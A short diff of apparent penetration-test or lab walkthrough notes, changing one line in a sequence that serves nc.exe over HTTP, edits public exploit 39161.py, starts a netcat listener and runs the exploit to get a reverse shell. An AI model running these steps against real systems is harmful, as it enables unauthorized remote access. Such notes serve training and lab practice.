@@ -89,7 +89,7 @@ cp /usr/share/windows-resources/binaries/nc.exe ./
 python -m SimpleHTTPServer 80
 
 vi 39161.py
-Change ip_addr and local_port accordingly for nc listener
+Change ip_addr and local_port
 nc -nvlp <port>
 
 python 39161.py <ip> <port>
